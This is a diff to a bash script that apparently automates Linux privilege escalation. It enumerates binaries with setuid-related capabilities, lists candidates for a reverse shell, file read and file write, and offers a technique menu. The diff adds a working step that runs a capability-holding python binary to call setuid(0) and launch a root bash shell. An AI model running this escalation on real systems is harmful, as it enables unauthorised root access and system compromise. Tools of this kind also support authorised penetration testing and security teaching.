@@ -47,22 +47,22 @@ cat << 'EOF'
  
 EOF
 
-echo "Shell (Capabilities) : "
+echo "Shell (CAP_SETUID Capability) : "
 ShellCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/ShellCap.txt; done)
 echo "$ShellCap"
 echo " "
 
-echo "Reverse Shell (Capabilities) : "
+echo "Reverse Shell (CAP_SETUID Capability) : "
 RevShellCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/RevShellCap.txt; done)
 echo "$RevShellCap"
 echo " "
 
-echo "File Read (Capabilities) : "
+echo "File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) : "
 FileReadCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid|cap_dac_override/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/ShellSUID.txt; done)
 echo "$FileReadCap"
 echo " "
 
-echo "File Write (Capabilities) : "
+echo "File Write (CAP_SETUID Capability) : "
 FileWriteCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/FileWriteCap.txt; done)
 echo "$FileWriteCap"
 echo " "
@@ -124,7 +124,9 @@ echo " "
 
 while true; do
     echo "Techniques : "
-    echo "1) Root Shell"
+    echo "1) Shell (CAP_SETUID Capability)"
+    echo "1) Shell (Sudo)"
+    echo "1) Shell (SUID)"
     echo "2) Reverse Shell"
     echo "3) File Read"
     echo "4) File Write"
@@ -134,48 +136,32 @@ while true; do
     
     echo " "
  
-    case "$choix" in
-       
-            
-        1)  echo "########## Root Shell Selected ##########"
-            echo " "
-        
-            echo "----- < Vulnerables Binaries with Capabilities > -----"
+    case "$choix" in            
+        1) 
+            echo "----- < Shell (CAP_SETUID Capability) > -----"
             echo " "
             if [ -z "$ShellCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
-                echo " "
+                continue
             else
                 echo "$ShellCap"
             fi
 
-            echo " "
-            echo "----- < Vulnerables Binaries that can be executed as root > -----"
-            echo " "
-            if [ -z "$ShellSudo" ]; then
-                echo "No Vulnerables Binaries that can be executed as root detected"
-                echo " "
-            else
-                echo "$ShellSudo"
-            fi
-
-            echo " "
-            echo "----- < Vulnerables Binaries with the SUID bit enabled > -----"
-            echo " "
-            if [ -z "$ShellSUID" ]; then
-                echo "No Vulnerables Binaries with the SUID bit enabled detected"
-                echo " "
-                continue
-            else
-                echo "$ShellSUID"
-            fi
-
-
-
-
-
-
-
+            select choice in $ShellCap "Go Back"; do
+                case "$choice" in
+                    *python*)
+                        echo "Trying with python3"
+                        "$choice" -c 'import os; os.setuid(0); os.system("bash")'
+                        ;;
+                    "Go Back")
+                        break
+                        ;;
+                    *)
+                        echo "Invalid Choice, Choose From : "
+                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
+                        ;;
+                esac
+            done               
             ;;
         5)
             echo "Quit"
